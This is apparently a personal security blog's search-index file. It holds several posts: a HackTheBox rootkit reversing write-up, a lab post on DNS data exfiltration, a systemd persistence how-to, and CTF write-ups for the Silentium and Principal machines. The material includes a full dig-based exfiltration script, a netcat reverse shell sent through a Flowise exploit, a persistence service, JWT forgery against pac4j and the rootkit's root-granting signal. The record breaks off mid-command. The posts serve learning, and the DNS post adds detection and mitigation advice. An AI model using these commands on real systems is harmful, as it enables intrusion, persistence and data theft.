<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox - Cyberpsychosis (Easy)</title>
      <link href="/2026/07/16/2026-07-16-reversing/"/>
      <url>/2026/07/16/2026-07-16-reversing/</url>
      
        <content type="html"><![CDATA[<p>The challenge was simple on paper: disarm a Linux kernel module rootkit and recover hidden data. In practice, this was my first Hack The Box challenge, and until now I had mostly played with crackmes. Getting an IP address and port as part of a reversing challenge already threw me off for a moment.</p><p>The provided file was <code>diamorphine.ko</code>. A <code>.ko</code> file is a Linux kernel object: it can be loaded with <code>insmod</code>, removed with <code>rmmod</code>, and listed with <code>lsmod</code> if the module is not hiding itself.</p><p><code>file</code> identified it as:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF 64-bit LSB relocatable, x86-64, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>That last part mattered. Because the module was not stripped, Ghidra still showed useful function names instead of leaving me with anonymous blobs. <code>strings</code> produced too much noise to be helpful, so I moved into Ghidra and started from the symbol tree.</p><p>The interesting functions were:</p><ul><li>diamorphine_init</li><li>diamorphine_cleanup</li><li>find_task</li><li>get_syscall_table_bf</li><li>give_root</li><li>hacked_getdents</li><li>hacked_getdents64</li><li>hacked_kill</li><li>is_invisible</li><li>module_hide</li><li>module_show</li></ul><p>Every kernel module has an initialization and cleanup path, which in this case were <code>diamorphine_init</code> and <code>diamorphine_cleanup</code>. The rest of the names were already a pretty good map of the rootkit:</p><ul><li><code>module_hide</code> and <code>module_show</code> remove or restore the module from the kernel’s module list, which is why <code>lsmod</code> may not show it.</li><li><code>give_root</code> does exactly what the name suggests.</li><li><code>get_syscall_table_bf</code> locates the syscall table by brute force.</li><li><code>is_invisible</code> checks whether a process has been marked as hidden.</li></ul><p>From there, the two most important hooks were <code>hacked_kill</code> and <code>hacked_getdents64</code>.</p><h2 id="hacked-kill-the-hidden-command-channel"><a href="#hacked-kill-the-hidden-command-channel" class="headerlink" title="hacked_kill: the hidden command channel"></a><code>hacked_kill</code>: the hidden command channel</h2><p>The rootkit hijacks the kill(pid, sig) syscall and repurposes specific signal numbers as covert commands. Any signal not matched below is passed through to the real kill().</p><table><thead><tr><th>Signal</th><th>Hex</th><th>Effect</th></tr></thead><tbody><tr><td><code>46</code></td><td><code>0x2e</code></td><td>Toggle rootkit visibility by hiding or showing it in <code>lsmod</code>.</td></tr><tr><td><code>64</code></td><td><code>0x40</code></td><td>Grant root to the calling process through <code>prepare_creds</code> and <code>commit_creds</code>.</td></tr><tr><td><code>31</code></td><td><code>0x1f</code></td><td>Toggle the invisible bit on the process matching the provided PID.</td></tr></tbody></table><p>This means <code>kill</code> is not just being used as <code>kill</code> anymore. It becomes a command interface into the rootkit.</p><h2 id="hacked-getdents64-file-and-directory-hiding"><a href="#hacked-getdents64-file-and-directory-hiding" class="headerlink" title="hacked_getdents64: file and directory hiding"></a><code>hacked_getdents64</code>: file and directory hiding</h2><p><code>getdents64</code> is used by tools like <code>ls</code> and <code>find</code> to read directory entries. The rootkit calls the real syscall first, then edits the returned results before userland sees them.</p><p>It filters entries in two places:</p><ul><li>For <code>/proc</code>, it parses directory names as PIDs. If the matching <code>task_struct</code> has the invisible bit set, that process is removed from the listing.</li><li>For normal directories, it compares filenames against the constant <code>psychosis</code>, decoded from the little-endian comparison in the code. Anything whose name starts with that prefix is hidden.</li></ul><p>The important takeaway: files or directories beginning with <code>psychosis</code> are invisible to normal directory listings, but they still exist on disk. If you know the exact path, direct access through tools like <code>cat</code> or <code>stat</code> can still work because the hiding happens when directory entries are listed.</p><h2 id="Disarming-the-rootkit"><a href="#Disarming-the-rootkit" class="headerlink" title="Disarming the rootkit"></a>Disarming the rootkit</h2><p>Once the behavior was clear, disarming it came down to using its own command channel against it.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. Confirm whether the module is hidden.</span></span><br><span class="line">lsmod                           <span class="comment"># diamorphine is missing because the module hides itself</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Unhide the module with magic signal 46.</span></span><br><span class="line"><span class="built_in">kill</span> -46 0</span><br><span class="line">lsmod                           <span class="comment"># diamorphine appears</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. Escalate to root using signal 64.</span></span><br><span class="line"><span class="built_in">kill</span> -64 0</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. Unload the module, which reverts the syscall table hooks.</span></span><br><span class="line">rmmod diamorphine</span><br><span class="line">lsmod                           <span class="comment"># diamorphine is gone again</span></span><br></pre></td></tr></table></figure><h2 id="Recovering-the-hidden-data"><a href="#Recovering-the-hidden-data" class="headerlink" title="Recovering the hidden data"></a>Recovering the hidden data</h2><p>With the module unloaded and the hooks removed, normal directory listings work again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -iname <span class="string">&quot;psychosis*&quot;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>Before disarming the module, <code>find</code> and <code>ls</code> are both filtered because they rely on <code>getdents64</code> under the hood. After removing the module, the hidden <code>psychosis*</code> path becomes visible and the data can be recovered normally.</p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> reversing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Data Exfiltration by Abusing DNS</title>
      <link href="/2026/07/13/2026-07-13-dns-data-exfil/"/>
      <url>/2026/07/13/2026-07-13-dns-data-exfil/</url>
      
        <content type="html"><![CDATA[<h1 id="Data-Exfiltration-by-Abusing-DNS"><a href="#Data-Exfiltration-by-Abusing-DNS" class="headerlink" title="Data Exfiltration by Abusing DNS"></a>Data Exfiltration by Abusing DNS</h1><h3 id="This-was-BreachLab’s-Phantom-The-Heist"><a href="#This-was-BreachLab’s-Phantom-The-Heist" class="headerlink" title="This was BreachLab’s Phantom The Heist"></a>This was BreachLab’s <a href="https://breachlab.org/">Phantom The Heist</a></h3><p>DNS is easy to overlook during a compromise. It is usually allowed out of a network, it is noisy by nature, and many environments focus harder on HTTP, SSH, or obvious file transfer tools. That makes it a useful channel for moving small amounts of data when a host can resolve external names.</p><p>In this lab example, the target file was:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/vault/classified.db</span><br></pre></td></tr></table></figure><p>The exfiltration command was:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i=0</span><br><span class="line"><span class="built_in">base32</span> -w0 /opt/vault/classified.db | <span class="built_in">tr</span> -d <span class="string">&#x27;=&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;A-Z&#x27;</span> <span class="string">&#x27;a-z&#x27;</span> | <span class="built_in">fold</span> -w32 | <span class="keyword">while</span> <span class="built_in">read</span> -r chunk; <span class="keyword">do</span></span><br><span class="line">    dig @10.13.37.30 <span class="string">&quot;<span class="variable">$&#123;chunk&#125;</span>.<span class="variable">$&#123;i&#125;</span>.123.exfil.local&quot;</span> A</span><br><span class="line">    i=$((i+<span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="How-It-Worked"><a href="#How-It-Worked" class="headerlink" title="How It Worked"></a>How It Worked</h2><p>The important trick is that DNS names can carry attacker-controlled text. Instead of sending the file directly over HTTP or copying it with <code>scp</code>, the file is encoded and placed into DNS query labels.</p><p>This part reads the file and converts it to DNS-safe text:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base32</span> -w0 /opt/vault/classified.db</span><br></pre></td></tr></table></figure><p>Raw database bytes cannot be safely placed into a domain name. Base32 converts the file into letters and numbers. The <code>-w0</code> option keeps the output on one line, which makes it easier to split into fixed-size chunks afterwards.</p><p>Then the output is cleaned up:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tr</span> -d <span class="string">&#x27;=&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;A-Z&#x27;</span> <span class="string">&#x27;a-z&#x27;</span></span><br></pre></td></tr></table></figure><p>Base32 padding uses <code>=</code> characters, but <code>=</code> is not valid inside a normal DNS label. Removing the padding makes the encoded text fit better into domain labels. Lowercasing the output is not strictly required, but it keeps the generated queries consistent.</p><p>Next, the encoded stream is split into small labels:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fold</span> -w32</span><br></pre></td></tr></table></figure><p>DNS has size limits. A single label can be up to 63 characters, and the full domain name can be up to 253 characters. Using 32-character chunks keeps each query comfortably inside those limits.</p><p>Finally, each chunk is placed into a DNS lookup:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.13.37.30 <span class="string">&quot;<span class="variable">$&#123;chunk&#125;</span>.<span class="variable">$&#123;i&#125;</span>.123.exfil.local&quot;</span> A</span><br></pre></td></tr></table></figure><p>Each query asks the DNS server at <code>10.13.37.30</code> for an <code>A</code> record. The requested hostname contains:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;encoded-data&gt;.&lt;sequence-number&gt;.123.exfil.local</span><br></pre></td></tr></table></figure><p>The sequence number matters because DNS queries can arrive out of order or be retried. On the receiving side, the DNS server logs the queried names. The data can then be reconstructed by sorting the chunks by their sequence number, joining the Base32 text, restoring padding if needed, and decoding it back into the original file.</p><p>The DNS response itself is not important here. The useful part is the question being asked.</p><h2 id="Why-DNS-Is-Useful-for-Abuse"><a href="#Why-DNS-Is-Useful-for-Abuse" class="headerlink" title="Why DNS Is Useful for Abuse"></a>Why DNS Is Useful for Abuse</h2><p>DNS is a good abuse channel because it often has a path out of restricted networks. Even when direct internet access is blocked, systems still need name resolution to reach package mirrors, update servers, internal services, SaaS applications, and authentication providers.</p><p>It also blends into normal traffic better than many obvious exfiltration methods. A host making DNS queries is expected behavior. Security tools may alert on suspicious domains or high query volume, but quiet, low-rate DNS traffic can be easier to miss than a new outbound TCP connection to an unfamiliar service.</p><p>Another advantage is that DNS works through delegation. If an attacker controls a domain such as:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exfil.example</span><br></pre></td></tr></table></figure><p>they can configure authoritative nameservers for it. Any lookup for a random subdomain under that zone, such as:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">datachunk.42.exfil.example</span><br></pre></td></tr></table></figure><p>eventually reaches infrastructure they control. That means the data can be captured just by observing DNS requests for the delegated zone.</p><p>DNS is not good for large files. It is slow, size-limited, and noisy when too much data is moved. But for small secrets, tokens, keys, hostnames, command output, or database snippets, it can be enough.</p><h2 id="What-to-Look-For"><a href="#What-to-Look-For" class="headerlink" title="What to Look For"></a>What to Look For</h2><p>Defenders can detect this technique by looking for DNS behavior that does not resemble normal browsing or service discovery:</p><ul><li>Long or high-entropy subdomains</li><li>Many unique subdomains under the same parent domain</li><li>Sequential labels such as <code>0</code>, <code>1</code>, <code>2</code>, <code>3</code></li><li>Repeated queries to unusual internal or external resolvers</li><li>DNS requests containing encoded-looking text</li><li>Large spikes in <code>NXDOMAIN</code> responses</li></ul><p>The example query structure is especially suspicious:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base32 chunk&gt;.&lt;counter&gt;.&lt;identifier&gt;.exfil.local</span><br></pre></td></tr></table></figure><p>A normal application usually does not generate hundreds of unique, random-looking hostnames with numeric counters.</p><h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>The strongest control is to force clients to use approved recursive resolvers and block direct DNS to arbitrary servers. In this example, the command explicitly queries:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.13.37.30</span><br></pre></td></tr></table></figure><p>If hosts are only allowed to talk to trusted DNS resolvers, direct exfiltration to an attacker-controlled resolver becomes harder.</p><p>Useful mitigations include:</p><ul><li>Block outbound DNS except from approved resolvers</li><li>Log DNS queries centrally</li><li>Alert on long, random, or high-volume subdomains</li><li>Monitor for newly seen domains and unusual TLDs</li><li>Limit which systems can resolve external names</li><li>Inspect DNS-over-HTTPS and DNS-over-TLS policy gaps</li></ul><p>DNS is necessary, so it cannot simply be turned off. The goal is to make DNS boring and predictable: known clients, known resolvers, logged queries, and alerts when hosts start using it like a transport protocol.</p>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> dns </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Persistence by Abusing systemd Services</title>
      <link href="/2026/06/27/2026-06-27-abusing-system-services/"/>
      <url>/2026/06/27/2026-06-27-abusing-system-services/</url>
      
        <content type="html"><![CDATA[<h1 id="Persistence-by-Abusing-systemd-Services"><a href="#Persistence-by-Abusing-systemd-Services" class="headerlink" title="Persistence by Abusing systemd Services"></a>Persistence by Abusing systemd Services</h1><p>User-level systemd services live in:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/.config/systemd/user/</span><br></pre></td></tr></table></figure><p>If the directory does not exist yet, create it first:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/.config/systemd/user</span><br></pre></td></tr></table></figure><p>Create a user service file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.config/systemd/user/persistence.service</span><br></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Persistence service</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=<span class="literal">on</span>eshot</span><br><span class="line"><span class="attr">ExecStart</span>=/bin/bash -c <span class="string">&#x27;echo pwned&#x27;</span></span><br><span class="line"><span class="attr">RemainAfterExit</span>=<span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=default.target</span><br></pre></td></tr></table></figure><p>Reload the user systemd manager and enable the service:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl --user daemon-reload</span><br><span class="line">systemctl --user <span class="built_in">enable</span> persistence.service</span><br></pre></td></tr></table></figure><p><code>enable</code> does not run the service immediately. It creates the user-level autostart link, so the service starts the next time the user’s <code>default.target</code> is reached. In most setups, that means the next login for that user.</p><p>To start it immediately as well:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl --user start persistence.service</span><br></pre></td></tr></table></figure><p>This provides persistence across logins and reboots where the user logs in again. If the service should start after boot without an interactive login, lingering must be enabled for that account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loginctl enable-linger <span class="string">&quot;<span class="variable">$USER</span>&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Silentium - CTF Writeup</title>
      <link href="/2026/06/04/2026-06-04-silentium/"/>
      <url>/2026/06/04/2026-06-04-silentium/</url>
      
        <content type="html"><![CDATA[<h1 id="Silentium-CTF-Writeup"><a href="#Silentium-CTF-Writeup" class="headerlink" title="Silentium - CTF Writeup"></a>Silentium - CTF Writeup</h1><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>A full TCP scan exposed SSH and an nginx web server. The web server redirected to the virtual host <code>silentium.htb</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -sV -p- 10.129.9.0</span><br></pre></td></tr></table></figure><table><thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr></thead><tbody><tr><td><code>22/tcp</code></td><td>SSH</td><td>OpenSSH 9.6p1 Ubuntu 3ubuntu13.15</td><td>Ubuntu host</td></tr><tr><td><code>80/tcp</code></td><td>HTTP</td><td>nginx 1.24.0</td><td>Redirects to <code>silentium.htb</code></td></tr></tbody></table><p>Virtual host enumeration revealed another application:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">staging.silentium.htb</span><br></pre></td></tr></table></figure><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The password reset flow on the staging host returned a useful backend error:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transaction is not started yet, start transaction before commiting or rolling it back</span><br></pre></td></tr></table></figure><p>The main site exposed a user named <code>Ben</code>, which gave a likely email address:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ben@silentium.htb</span><br></pre></td></tr></table></figure><p>The staging application was running Flowise <code>3.0.5</code>. This version is affected by CVE-2025-58434, where the password reset endpoint exposes a valid <code>tempToken</code> in the response. Using the leaked token, I reset Ben’s password and authenticated to the staging application.</p><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>After logging in to Flowise, I used the public Flowise <code>3.0.5</code> exploit to get command execution:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py \</span><br><span class="line">  --email ben@silentium.htb \</span><br><span class="line">  --password <span class="string">&#x27;&lt;new-password&gt;&#x27;</span> \</span><br><span class="line">  --url http://staging.silentium.htb/ \</span><br><span class="line">  --cmd <span class="string">&#x27;nc &lt;tun0-ip&gt; 1337 -e sh&#x27;</span></span><br></pre></td></tr></table></figure><p>The container did not have <code>bash</code>, so the shell had to be stabilized with <code>ash</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/ash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># Ctrl+Z</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure><h2 id="Container-Enumeration"><a href="#Container-Enumeration" class="headerlink" title="Container Enumeration"></a>Container Enumeration</h2><p>The full environment and database dumps were noisy. The important finding was that the container exposed SMTP credentials for the <code>ben</code> account:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FLOWISE_USERNAME=ben</span><br><span class="line">SMTP_HOST=mailhog</span><br><span class="line">SMTP_PORT=1025</span><br><span class="line">SMTP_PASSWORD=&lt;reused-password&gt;</span><br></pre></td></tr></table></figure><p>The SMTP password was reused for SSH, which gave a stable shell as <code>ben</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ben@silentium.htb</span><br></pre></td></tr></table></figure><h2 id="Internal-Services"><a href="#Internal-Services" class="headerlink" title="Internal Services"></a>Internal Services</h2><p>From the host, several services were only listening locally:</p><table><thead><tr><th>Address</th><th>Service</th><th>Notes</th></tr></thead><tbody><tr><td><code>127.0.0.1:3000</code></td><td>Flowise</td><td>Internal Flowise service</td></tr><tr><td><code>127.0.0.1:3001</code></td><td>Gogs</td><td>Internal Git service</td></tr><tr><td><code>127.0.0.1:1025</code></td><td>SMTP</td><td>MailHog SMTP</td></tr><tr><td><code>127.0.0.1:8025</code></td><td>HTTP</td><td>MailHog web UI</td></tr></tbody></table><p>The Gogs configuration was readable from:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/gogs/gogs/custom/conf/app.ini</span><br></pre></td></tr></table></figure><p>The relevant settings were:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">RUN_USER</span> = root</span><br><span class="line"></span><br><span class="line"><span class="section">[server]</span></span><br><span class="line"><span class="attr">HTTP_ADDR</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">HTTP_PORT</span> = <span class="number">3001</span></span><br><span class="line"><span class="attr">DOMAIN</span> = staging-v2-code.dev.silentium.htb</span><br><span class="line"><span class="attr">ROOT_URL</span> = http://staging-v2-code.dev.silentium.htb/</span><br><span class="line"></span><br><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">TYPE</span> = sqlite3</span><br><span class="line"><span class="attr">PATH</span> = /opt/gogs/data/gogs.db</span><br><span class="line"></span><br><span class="line"><span class="section">[repository]</span></span><br><span class="line"><span class="attr">ROOT_PATH</span> = /root/gogs-repositories</span><br></pre></td></tr></table></figure><p>The key detail is that Gogs runs as <code>root</code> and stores repositories under <code>/root/gogs-repositories</code>.</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>After adding a public key through Gogs, SSH authentication as <code>root</code> reached the Gogs git shell instead of an interactive shell:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi there, You&#x27;ve successfully authenticated, but Gogs does not provide shell access.</span><br></pre></td></tr></table></figure><p>That confirmed the key path was being handled by Gogs, but it did not directly provide root access.</p><p>The useful escalation path is the Gogs <code>PutContents</code> symlink issue tracked as CVE-2025-8110. With an authenticated Gogs user, the vulnerable API can be abused to write through a repository symlink. Because this instance runs as <code>root</code>, that write can target root-owned paths such as <code>/root/.ssh/authorized_keys</code>.</p><p>Useful target details:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Gogs URL: http://staging-v2-code.dev.silentium.htb/</span><br><span class="line">Gogs data: /opt/gogs/data/gogs.db</span><br><span class="line">Repository root: /root/gogs-repositories</span><br></pre></td></tr></table></figure><p>References:</p><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-58434">CVE-2025-58434 - NVD</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-8110">CVE-2025-8110 - NVD</a></li><li><a href="https://github.com/BridgerAlderson/CVE-2025-81110-PoC">CVE-2025-81110 PoC</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Principal - CTF Writeup</title>
      <link href="/2026/05/31/2026-05-31-principal/"/>
      <url>/2026/05/31/2026-05-31-principal/</url>
      
        <content type="html"><![CDATA[<h1 id="Principal-CTF-Writeup"><a href="#Principal-CTF-Writeup" class="headerlink" title="Principal - CTF Writeup"></a>Principal - CTF Writeup</h1><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>The initial port scan showed only two exposed services: SSH and a Jetty-based web application on port <code>8080</code>.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 09:52 -0400</span><br><span class="line">Nmap scan report for 10.129.244.220</span><br><span class="line">Host is up (0.012s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http-proxy Jetty</span><br></pre></td></tr></table></figure><p>The HTTP service redirected to <code>/login</code> and exposed an interesting application header:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Jetty</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>pac4j-jwt/6.0.3</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>/login</span><br></pre></td></tr></table></figure><table><thead><tr><th>Port</th><th>Service</th><th>Notes</th></tr></thead><tbody><tr><td><code>22/tcp</code></td><td>SSH</td><td>OpenSSH 9.6p1 on Ubuntu</td></tr><tr><td><code>8080/tcp</code></td><td>HTTP &#x2F; Jetty</td><td>Login page with <code>pac4j-jwt/6.0.3</code> header</td></tr></tbody></table><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>After checking the visible application and finding no obvious path forward, the <code>X-Powered-By</code> header became the main lead:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Powered-By: pac4j-jwt/6.0.3</span><br></pre></td></tr></table></figure><p>Searching for this version led to a public writeup about a pac4j JWT authentication bypass:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.codeant.ai/security-research/pac4j-jwt-authentication-bypass-public-key</span><br></pre></td></tr></table></figure><p>The application also exposed useful client-side logic in:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static/app.js</span><br></pre></td></tr></table></figure><p>That JavaScript file contained the public key needed for token forging. At first, the forged token still did not grant access because I missed one important detail in the frontend auth flow: the token had to be placed in session storage as <code>auth_token</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;auth_token&quot;</span>, token);</span><br></pre></td></tr></table></figure><p>Once the forged JWT was stored in the expected place, the application accepted it.</p><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>The application revealed an encryption key:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D3pl0y_$$H_Now42!</span><br></pre></td></tr></table></figure><p>Using that key, I was able to authenticate over SSH as <code>svc-deploy</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh svc-deploy@10.129.244.220</span><br></pre></td></tr></table></figure><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>After logging in, group enumeration showed that <code>svc-deploy</code> was a member of the <code>deployers</code> group:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">groups</span></span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deployers</span><br></pre></td></tr></table></figure><p>Files owned by the <code>deployers</code> group revealed a custom SSH certificate setup:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -group deployers -<span class="built_in">ls</span> 